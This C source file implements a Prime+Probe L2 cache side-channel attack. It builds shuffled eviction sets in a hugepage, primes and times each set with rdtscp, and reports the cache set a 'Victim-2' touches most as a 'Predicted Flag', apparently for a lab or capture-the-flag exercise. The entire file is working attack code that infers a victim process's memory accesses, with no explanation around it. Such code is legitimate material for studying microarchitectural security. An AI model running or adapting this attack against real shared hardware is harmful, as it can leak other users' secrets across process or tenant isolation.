#include "util.h"
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define L2_SETS      1024
#define L2_WAYS      16
#define L2_LINE      64
#define STRIDE       (1 << 17) // 128KB
#define BUFF_SIZE    (1 << 21) // 2MB Hugepage
#define ROUNDS       35000     // High rounds to find the weak victim-2 signal

static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

struct node {
    struct node *next;
    struct node *prev; 
    char pad[L2_LINE - 2 * sizeof(struct node *)];
};

// Global variables so all functions can access them
void *buf;
struct node *sets_head[L2_SETS];
struct node *sets_tail[L2_SETS];
uint64_t scores[L2_SETS];

void build_set(int s) {
    char *base = (char *)buf;
    struct node *nodes[L2_WAYS];

    for (int i = 0; i < L2_WAYS; i++) {
        nodes[i] = (struct node *)(base + (s * L2_LINE) + (i * STRIDE));
    }

    // Shuffle ways to defeat the hardware prefetcher
    for (int i = L2_WAYS - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        struct node *tmp = nodes[i];
        nodes[i] = nodes[j];
        nodes[j] = tmp;
    }

    for (int i = 0; i < L2_WAYS - 1; i++) {
        nodes[i]->next = nodes[i+1];
        nodes[i+1]->prev = nodes[i];
    }
    nodes[L2_WAYS-1]->next = NULL;
    nodes[0]->prev = NULL;
    
    sets_head[s] = nodes[0];
    sets_tail[s] = nodes[L2_WAYS-1];
}

// Aggressive Priming: Hammer the set 3 times to ensure the Pseudo-LRU 
// replacement policy fully evicts the victim's data.
void prime_set(int s) {
    // Increase to 6 passes to "lock" your addresses into the LRU positions
    for (int repeat = 0; repeat < 6; repeat++) {
        struct node *curr = sets_head[s];
        while (curr) {
            curr = curr->next;
        }
    }
}

uint64_t probe_set(int s) {
    register struct node *curr = sets_tail[s]; // Use register for speed
    
    asm volatile("lfence");
    uint64_t t1 = rdtscp();
    asm volatile("lfence");

    while (curr) {
        curr = curr->prev;
    }

    asm volatile("lfence");
    uint64_t t2 = rdtscp();
    asm volatile("lfence");
    
    return t2 - t1;
}

int main(int argc, char **argv) {
    srand(time(NULL));

    // 1. Allocate Hugepage
    buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if (buf == (void *)-1) {
        perror("Hugepages not available, using standard mmap (results may be poor)");
        buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                   MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (buf == (void *)-1) exit(1);
    }
    memset(buf, 0, BUFF_SIZE);

    for (int i = 0; i < L2_SETS; i++) build_set(i);

    // 2. Threshold: Victim-2 causes a very small timing increase.
    uint64_t threshold = 295;
    printf("Scanning for Victim-2 (Threshold: %lu, Rounds: %d)...\n", threshold, ROUNDS);

    // 3. The Scan Loop
    for (int s = 0; s < L2_SETS; s++) {
        uint64_t hits = 0;
        for (int r = 0; r < ROUNDS; r++) {
            prime_set(s);
            
            // Victim delay
            for (volatile int k = 0; k < 250; k++); 

            if (probe_set(s) > threshold) {
                hits++;
            }
        }
        scores[s] = hits;

        // Print sets that show any activity above background noise
        if (hits > ROUNDS * 0.1) {
            printf("  Set %d: %lu hits\n", s, hits);
        }
    }

    // 4. Result
    int flag = -1;
    uint64_t max_hits = 0;
    for (int i = 0; i < L2_SETS; i++) {
        if (scores[i] > max_hits) {
            max_hits = scores[i];
            flag = i;
        }
    }

    printf("\n--- Result ---\nPredicted Flag: %d (Score: %lu)\n", flag, max_hits);
    return 0;
}